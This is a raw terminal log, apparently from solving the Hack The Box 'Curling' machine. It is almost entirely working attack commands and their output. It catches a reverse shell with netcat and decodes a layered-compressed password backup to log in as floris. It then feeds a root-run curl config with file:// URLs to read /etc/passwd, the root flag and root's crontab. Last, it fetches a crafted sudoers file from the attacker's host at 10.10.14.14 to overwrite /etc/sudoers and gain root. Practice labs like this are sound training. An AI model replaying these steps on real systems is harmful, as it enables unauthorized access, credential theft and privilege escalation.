┌─[root@parrot]─[~/hackthebox/curling]
└──╼ #echo $TERM                      
screen-256color                       
┌─[root@parrot]─[~/hackthebox/curling]
└──╼ #nc -nvlp 9001                   
Ncat: Version 7.80 ( https://nmap.org/ncat )                                
Ncat: Listening on :::9001            
Ncat: Listening on 0.0.0.0:9001       
Ncat: Connection from 10.10.10.150.   
Ncat: Connection from 10.10.10.150:58434.                                   
bash: cannot set terminal process group (1363): Inappropriate ioctl for device                                                                          
bash: no job control in this shell    
www-data@curling:/var/www/html/templates/protostar$ python -c "import pty;pty.spawn('/bin/bash')"                                                       
<star$ python -c "import pty;pty.spawn('/bin/bash')"                        

Command 'python' not found, but can be installed with:                      

apt install python3                   
apt install python                    
apt install python-minimal            

Ask your administrator to install one of them.                              

You also have python3 installed, you can run 'python3' instead.             

www-data@curling:/var/www/html/templates/protostar$ python3 -c "import pty;pty.spawn('/bin/bash')"                                                      
<tar$ python3 -c "import pty;pty.spawn('/bin/bash')"                        
www-data@curling:/var/www/html/templates/protostar$ ^Z                      
[1]+  Stopped                 nc -nvlp 9001                                 
┌─[✗]─[root@parrot]─[~/hackthebox/curling]                                  
└──╼ #stty raw -echo                  
┌─[root@parrot]─[~/hackthebox/curling]
└──╼ #nc -nvlp 9001                   

<ml/templates/protostar$ export TERM=screen-256color                        
www-data@curling:/var/www/html/templates/protostar$ cd /dev/shm             
www-data@curling:/dev/shm$ cp ~/floris/password_backup .                    
cp: cannot stat '/var/www/floris/password_backup': No such file or directory                                                                            
www-data@curling:/dev/shm$ cd ~       
www-data@curling:/var/www$ ls         
html                                  
www-data@curling:/var/www$ cd ~floris 
www-data@curling:/home/floris$ ls     
admin-area  password_backup  user.txt 
www-data@curling:/home/floris$ cd /dev/shm                                  
www-data@curling:/dev/shm$ clear      
www-data@curling:/dev/shm$ ls         
www-data@curling:/dev/shm$ cp ~floris/password_backup                       
cp: missing destination file operand after '/home/floris/password_backup'   
Try 'cp --help' for more information. 
www-data@curling:/dev/shm$ cp ~floris/password_backup .                     
www-data@curling:/dev/shm$ ls         
password_backup                       
www-data@curling:/dev/shm$ cat password_backup                              
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..         
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4         
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`         
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......         
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..         
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4         
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..         
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x         
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1         
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."         
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.         
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..         
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C         
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..         
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.         
000000f0: 819b bb48                                ...H                     
www-data@curling:/dev/shm$ xxd -r password_backup > 1                       
www-data@curling:/dev/shm$ ls         
1  password_backup                    
www-data@curling:/dev/shm$ file 1     
1: bzip2 compressed data, block size = 900k                                 
www-data@curling:/dev/shm$ bzcat 1 > 2
www-data@curling:/dev/shm$ zcat 2 > 3 
www-data@curling:/dev/shm$ file 3     
3: bzip2 compressed data, block size = 900k                                 
www-data@curling:/dev/shm$ bzcat 3 > 4
www-data@curling:/dev/shm$ file 4     
4: POSIX tar archive (GNU)            
www-data@curling:/dev/shm$ tar -xf 4  
www-data@curling:/dev/shm$ ls         
1  2  3  4  password.txt  password_backup                                   
www-data@curling:/dev/shm$ cat password.txt                                 
5d<wdCbdZu)|hChXll                    
www-data@curling:/dev/shm$ su - floris
Password:                             
floris@curling:~$ ls                  
admin-area  password_backup  user.txt 
floris@curling:~$ cat user.txt        
65dd1df0713b40d88ead98cf11b8530b      
floris@curling:~$ cd admin-area/      
floris@curling:~/admin-area$ ls -la   
total 28                              
drwxr-x--- 2 root   floris  4096 May 22  2018 .                             
drwxr-xr-x 6 floris floris  4096 May 22  2018 ..                            
-rw-rw---- 1 root   floris    25 Dec 31 01:29 input                         
-rw-rw---- 1 root   floris 14236 Dec 31 01:29 report                        
floris@curling:~/admin-area$ file input                                     
input: ASCII text                     
floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"              
floris@curling:~/admin-area$ file report                                    
report: HTML document, UTF-8 Unicode text, with very long lines, with CRLF, CR, LF line terminators                                                     
floris@curling:~/admin-area$ date     
Tue Dec 31 01:31:08 UTC 2019          
floris@curling:~/admin-area$          
floris@curling:~/admin-area$          
floris@curling:~/admin-area$          
floris@curling:~/admin-area$          
floris@curling:~/admin-area$          
floris@curling:~/admin-area$          
floris@curling:~/admin-area$ ls       
input  report                         
floris@curling:~/admin-area$ cat report                                     
<!DOCTYPE html>                       
<html lang="en-gb" dir="ltr">         
<head>                                
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />                                                                        
        <meta charset="utf-8" />      
        <base href="http://127.0.0.1/" />                                   
        <meta name="description" content="best curling site on the planet!" />                                                                          
        <meta name="generator" content="Joomla! - Open Source Content Management" />                                                                    
        <title>Home</title>           
        <link href="/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />                                  
        <link href="/index.php?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />                               
        <link href="/templates/protostar/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />                                            
        <link href="/templates/protostar/css/template.css?4c6b364068a1c45e7cd3bb9b6a49b052" rel="stylesheet" />                                         
        <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" />                                                              
        <style>                       

        h1, h2, h3, h4, h5, h6, .site-title {                               
                font-family: 'Open Sans', sans-serif;                       
        }                             
        </style>                      
        <script type="application/json" class="joomla-script-options new">{"csrf.token":"aaee6f1570360482f06da53a01d74a07","system.paths":{"root":"","base":""},"system.keepalive":{"interval":840000,"uri":"\/index.php\/component\/ajax\/?format=json"}}</script>                                             
        <script src="/media/jui/js/jquery.min.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script>                                                            
        <script src="/media/jui/js/jquery-noconflict.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script>                                                     
        <script src="/media/jui/js/jquery-migrate.min.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script>                                                    
        <script src="/media/system/js/caption.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script>                                                            
        <script src="/media/jui/js/bootstrap.min.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script>                                                         
        <script src="/templates/protostar/js/template.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script>                                                    
        <!--[if lt IE 9]><script src="/media/jui/js/html5.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script><![endif]-->                                    
        <script src="/media/system/js/core.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script>                                                               
        <!--[if lt IE 9]><script src="/media/system/js/polyfill.event.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script><![endif]-->                        
        <script src="/media/system/js/keepalive.js?4c6b364068a1c45e7cd3bb9b6a49b052"></script>                                                          
        <script>                      
jQuery(window).on('load',  function() {                                     
                                new JCaption('img.caption');                
jQuery(function($){ initTooltips(); $("body").on("subform-row-add", initTooltips); function initTooltips (event, container) { container = container || document;$(container).find(".hasTooltip").tooltip({"html": true,"container": "body"});} });                                                              
        </script>                     

</head>                               
<body class="site com_content view-featured no-layout no-task itemid-101">  
        <!-- Body -->                 
        <div class="body" id="top">   
                <div class="container">                                     
                        <!-- Header -->                                     
                        <header class="header" role="banner">               
                                <div class="header-inner clearfix">         
                                        <a class="brand pull-left" href="/">                                                                            
                                                <span class="site-title" title="Cewl Curling site!">Cewl Curling site!</span>                          </a>                                   
                                        <div class="header-search pull-right">                                                                          

                                        </div>                              
                                </div>                                      
                        </header>     

                        <div class="row-fluid">                             
                                                                <main id="content" role="main" class="span9">                                           
                                        <!-- Begin Content -->              

                                        <div id="system-message-container"> 
        </div>                        

                                        <div class="blog-featured" itemscope itemtype="https://schema.org/Blog">                                        
<div class="page-header">             
        <h1>                          
        Home    </h1>                 
</div>                                

<div class="items-leading clearfix">  
                        <div class="leading-0 clearfix"                     
                        itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">                                                        


        <h2 class="item-title" itemprop="headline">                         
                        <a href="/index.php/2-uncategorised/3-what-s-the-object-of-curling" itemprop="url">                                             
                        What's the object of curling?           </a>        
                </h2>                 



<div class="icons">                   

                                        <div class="btn-group pull-right">  
                                <button class="btn dropdown-toggle" type="button" id="dropdownMenuButton-3" aria-label="User tools"                     
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">                                                      
                                        <span class="icon-cog" aria-hidden="true"></span>                                                               
                                        <span class="caret" aria-hidden="true"></span>                                                                  
                                </button>                                   
                                                                <ul class="dropdown-menu" aria-labelledby="dropdownMenuButton-3">                       
                                                                                        <li class="print-icon"> <a href="/index.php/2-uncategorised/3-what-s-the-object-of-curling?tmpl=component&amp;print=1" title="Print article < What&#039;s the object of curling? >" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow">                   <span class="icon-print" aria-hidden="true"></span> 
                Print   </a> </li>    
                                                                                                                                                       </ul>                                  
                        </div>        

        </div>                        



                        <dl class="article-info muted">                     


                        <dt class="article-info-term">                      
                                                                        Details                                                 </dt>                   

                                                        <dd class="createdby" itemprop="author" itemscope itemtype="https://schema.org/Person">         
                                        Written by <span itemprop="name">Super User</span>      </dd>                                                   


                                                                                <dd class="category-name">                                              
                                                                                                                                                Category: <a href="/index.php/2-uncategorised" itemprop="genre">Uncategorised</a>                                                       </dd>                   

                                                                                <dd class="published">                                                  
                                <span class="icon-calendar" aria-hidden="true"></span>                                                                  
                                <time datetime="2018-05-22T18:54:21+00:00" itemprop="datePublished">                                                    
                                        Published: 22 May 2018                          </time>                                                         
                        </dd>         



                                                                                <dd class="hits">                                                       
                                        <span class="icon-eye-open" aria-hidden="true"></span>                                                          
                                        <meta itemprop="interactionCount" content="UserPageVisits:4" />                                                 
                                        Hits: 4                 </dd>                                           </dl>                                   



<p>Good question. First, let's get a bit of the jargon down. The playing surface in curling is called "the sheet." Sheet dimensions can vary, but they're usually around 150 feet long by about 15 feet wide. The sheet is covered with tiny droplets of water that become ice and cause the stones to "curl," or deviate from a straight path. These water droplets are known as "pebble."</p>                                                                      



                </div>                
                        </div>        


                <div class="items-row cols-3 row-0 row-fluid">              
                                        <div class="item column-1 span4"    
                                itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">                                                


        <h2 class="item-title" itemprop="headline">                         
                        <a href="/index.php/2-uncategorised/2-curling-you-know-its-true" itemprop="url">                                                
                        Curling you know its true!              </a>        
                </h2>                 



<div class="icons">                   

                                        <div class="btn-group pull-right">  
                                <button class="btn dropdown-toggle" type="button" id="dropdownMenuButton-2" aria-label="User tools"                     
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">                                                      
                                        <span class="icon-cog" aria-hidden="true"></span>                                                               
                                        <span class="caret" aria-hidden="true"></span>                                                                  
                                </button>                                   
                                                                <ul class="dropdown-menu" aria-labelledby="dropdownMenuButton-2">                       
                                                                                        <li class="print-icon"> <a href="/index.php/2-uncategorised/2-curling-you-know-its-true?tmpl=component&amp;print=1" title="Print article < Curling you know its true! >" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow">     <span class="icon-print" aria-hidden="true"></span>                          
                Print   </a> </li>    
                                                                                                                                                       </ul>                                  
                        </div>        

        </div>                        



                        <dl class="article-info muted">                     


                        <dt class="article-info-term">                      
                                                                        Details                                                 </dt>                   

                                                        <dd class="createdby" itemprop="author" itemscope itemtype="https://schema.org/Person">         
                                        Written by <span itemprop="name">Super User</span>      </dd>                                                   


                                                                                <dd class="category-name">                                              
                                                                                                                                                Category: <a href="/index.php/2-uncategorised" itemprop="genre">Uncategorised</a>                                                       </dd>                   

                                                                                <dd class="published">                                                  
                                <span class="icon-calendar" aria-hidden="true"></span>                                                                  
                                <time datetime="2018-05-22T18:53:17+00:00" itemprop="datePublished">                                                    
                                        Published: 22 May 2018                          </time>                                                         
                        </dd>         



                                                                                <dd class="hits">                                                       
                                        <span class="icon-eye-open" aria-hidden="true"></span>                                                          
                                        <meta itemprop="interactionCount" content="UserPageVisits:4" />                                                 
                                        Hits: 4                 </dd>                                           </dl>                                   



<p>Curling is absolutely the best sport to watch on television, particularly for viewers looking for an escape from the frantic "more, faster, bigger, higher" grind of most televised games. Watching basketball or hockey can get you so hyped up, you feel like drinking a Red Bull and doing jumping jacks. Watching curling makes you want to drink a glass of red wine and lie down on the shag carpet. Curling is deliberate. Thoughtful, even. The games move very slowly. The players spend a lot of time talking strategy. There are nods and quiet words of encouragement; rarely are there disagreements. When it comes time for a team member to play their turn by sliding a stone down the ice, the moves are elegant. There's a wind up, a push-off, a slide, and a gentle release. Such poise and finesse!</p>                                     



                        </div>        



                                        <div class="item column-2 span4"    
                                itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">                                                


        <h2 class="item-title" itemprop="headline">                         
                        <a href="/index.php/2-uncategorised/1-first-post-of-curling2018" itemprop="url">                                                
                        My first post of curling in 2018!               </a>
                </h2>                 



<div class="icons">                   

                                        <div class="btn-group pull-right">  
                                <button class="btn dropdown-toggle" type="button" id="dropdownMenuButton-1" aria-label="User tools"                     
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">                                                      
                                        <span class="icon-cog" aria-hidden="true"></span>                                                               
                                        <span class="caret" aria-hidden="true"></span>                                                                  
                                </button>                                   
                                                                <ul class="dropdown-menu" aria-labelledby="dropdownMenuButton-1">                       
                                                                                        <li class="print-icon"> <a href="/index.php/2-uncategorised/1-first-post-of-curling2018?tmpl=component&amp;print=1" title="Print article < My first post of curling in 2018! >" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow">                       <span class="icon-print" aria-hidden="true"></span> 
                Print   </a> </li>    
                                                                                                                                                       </ul>                                  
                        </div>        

        </div>                        



                        <dl class="article-info muted">                     


                        <dt class="article-info-term">                      
                                                                        Details                                                 </dt>                   

                                                        <dd class="createdby" itemprop="author" itemscope itemtype="https://schema.org/Person">         
                                        Written by <span itemprop="name">Super User</span>      </dd>                                                   


                                                                                <dd class="category-name">                                              
                                                                                                                                                Category: <a href="/index.php/2-uncategorised" itemprop="genre">Uncategorised</a>                                                       </dd>                   

                                                                                <dd class="published">                                                  
                                <span class="icon-calendar" aria-hidden="true"></span>                                                                  
                                <time datetime="2018-05-22T18:51:53+00:00" itemprop="datePublished">                                                    
                                        Published: 22 May 2018                          </time>                                                         
                        </dd>         



                                                                                <dd class="hits">                                                       
                                        <span class="icon-eye-open" aria-hidden="true"></span>                                                          
                                        <meta itemprop="interactionCount" content="UserPageVisits:4" />                                                 
                                        Hits: 4                 </dd>                                           </dl>                                   



<p>Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!</p>                                
<p>- Floris</p>                       



                        </div>        


                </div>                




</div>                                

                                        <div class="clearfix"></div>        

<ul itemscope itemtype="https://schema.org/BreadcrumbList" class="breadcrumb">                                                                          
                        <li>          
                        You are here: &#160;                                
                </li>                 

                                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="active">                         
                                <span itemprop="name">                      
                                        Home                            </span>                                                                         
                                <meta itemprop="position" content="1">      
                        </li>         
                </ul>                 

                                        <!-- End Content -->                
                                </main>                                     
                                                                        <div id="aside" class="span3">                                                  
                                                <!-- Begin Right Sidebar -->                                                                            
                                                <div class="well _menu"><h3 class="page-header">Main Menu</h3><ul class="nav menu">                     
<li class="item-101 default current active"><a href="/index.php" >Home</a></li></ul>                                                                    
</div><div class="well "><h3 class="page-header">Login Form</h3><form action="/index.php" method="post" id="login-form" class="form-inline">            
                <div class="userdata">                                      
                <div id="form-login-username" class="control-group">        
                        <div class="controls">                              
                                                                        <div class="input-prepend">                                                     
                                                <span class="add-on">       
                                                        <span class="icon-user hasTooltip" title="Username"></span>                                     
                                                        <label for="modlgn-username" class="element-invisible">Username</label>                         
                                                </span>                     
                                                <input id="modlgn-username" type="text" name="username" class="input-small" tabindex="0" size="18" placeholder="Username" />                  
                                        </div>                              
                                                        </div>              
                </div>                
                <div id="form-login-password" class="control-group">        
                        <div class="controls">                              
                                                                        <div class="input-prepend">                                                     
                                                <span class="add-on">       
                                                        <span class="icon-lock hasTooltip" title="Password">                                            
                                                        </span>             
                                                                <label for="modlgn-passwd" class="element-invisible">Password                          </label>                               
                                                </span>                     
                                                <input id="modlgn-passwd" type="password" name="password" class="input-small" tabindex="0" size="18" placeholder="Password" />                
                                        </div>                              
                                                        </div>              
                </div>                
                                                <div id="form-login-remember" class="control-group checkbox">                                           
                        <label for="modlgn-remember" class="control-label">Remember Me</label> <input id="modlgn-remember" type="checkbox" name="remember" class="inputbox" value="yes"/>     
                </div>                
                                <div id="form-login-submit" class="control-group">                                                                      
                        <div class="controls">                              
                                <button type="submit" tabindex="0" name="Submit" class="btn btn-primary login-button">Log in</button>                   
                        </div>        
                </div>                
                                        <ul class="unstyled">               
                                                        <li>                
                                        <a href="/index.php/component/users/?view=remind&amp;Itemid=101">                                               
                                        Forgot your username?</a>           
                                </li> 
                                <li>  
                                        <a href="/index.php/component/users/?view=reset&amp;Itemid=101">                                                
                                        Forgot your password?</a>           
                                </li> 
                        </ul>         
                <input type="hidden" name="option" value="com_users" />     
                <input type="hidden" name="task" value="user.login" />      
                <input type="hidden" name="return" value="aHR0cDovLzEyNy4wLjAuMS8=" />                                                                  
                <input type="hidden" name="aaee6f1570360482f06da53a01d74a07" value="1" />       </div>                                                  
        </form>                       
</div>                                
                                                <!-- End Right Sidebar -->  
                                        </div>                              
                                                        </div>              
                </div>                
        </div>                        
        <!-- Footer -->               
        <footer class="footer" role="contentinfo">                          
                <div class="container">                                     
                        <hr />        

                        <p class="pull-right">                              
                                <a href="#top" id="back-top">               
                                        Back to Top                             </a>                                                                    
                        </p>          
                        <p>           
                                &copy; 2019 Cewl Curling site!                  </p>                                                                    
                </div>                
        </footer>                     

</body>                               
      <!-- secret.txt -->             
</html>                               
floris@curling:~/admin-area$ clear    
floris@curling:~/admin-area$ ls       
input  report                         
floris@curling:~/admin-area$ vi input 
floris@curling:~/admin-area$          
floris@curling:~/admin-area$ cat input
url = "http://10.10.14.14:8000/gyan"  
floris@curling:~/admin-area$ vi input 
floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"              
floris@curling:~/admin-area$ vi input 
floris@curling:~/admin-area$ cat input
url = "file:///etc/passwd"            
floris@curling:~/admin-area$ watch -n 1 cat report                          
floris@curling:~/admin-area$ vi input 
floris@curling:~/admin-area$ cat input
url = "file:///root/root.txt"         
floris@curling:~/admin-area$ watch -n 1 cat report                                                                                                      
floris@curling:~/admin-area$ clear    
floris@curling:~/admin-area$ ls       
input  report                         
floris@curling:~/admin-area$ vi input 
floris@curling:~/admin-area$ cat input
url = "file:///var/spool/cron/crontabs/root"                                
floris@curling:~/admin-area$ wach -n 1 cat report                           

Command 'wach' not found, did you mean:                                     

  command 'wash' from deb reaver      
  command 'wcch' from deb wcc         
  command 'watch' from deb procps     

Try: apt install <deb name>           

floris@curling:~/admin-area$ ls       
input  report                         
floris@curling:~/admin-area$ watch -n 1 cat report                          
floris@curling:~/admin-area$ cat input                                      
url = "file:///var/spool/cron/crontabs/root"                                
floris@curling:~/admin-area$ watch -n 1 cat report                          
floris@curling:~/admin-area$ cat input                                                                                                                  
url = "http://127.0.0.1"              
floris@curling:~/admin-area$ vi input 
floris@curling:~/admin-area$ cat input
url = "http://127.0.0.1"              
floris@curling:~/admin-area$ vi input 
floris@curling:~/admin-area$ cat input                                                                                                                  
url = "file:///var/spool/cron/crontabs/root"                                
floris@curling:~/admin-area$ watch -n 1 cat report                                                                                                      
floris@curling:~/admin-area$ vi input 
floris@curling:~/admin-area$ cat input                                      
url = "http://10.10.14.14:8000/sudoers"                                     
output = "/etc/sudoers"               
user-agent = "arrow1326/1.0"          
floris@curling:~/admin-area$ sudo su -
[sudo] password for floris:           
root@curling:~# ls                    
default.txt  root.txt                 
root@curling:~# cat root.txt          
82c198ab6fc5365fdc6da2ee5c26064a      
root@curling:~# exit                  
logout                                
floris@curling:~/admin-area$ exit     
logout                                
www-data@curling:/dev/shm$ exit       
exit                                  
www-data@curling:/var/www/html/templates/protostar$ exit                    
                                                        exit                
                                                            ┌─[root@parrot]─[~/hackthebox/curling]                                                      
└──╼ #                                
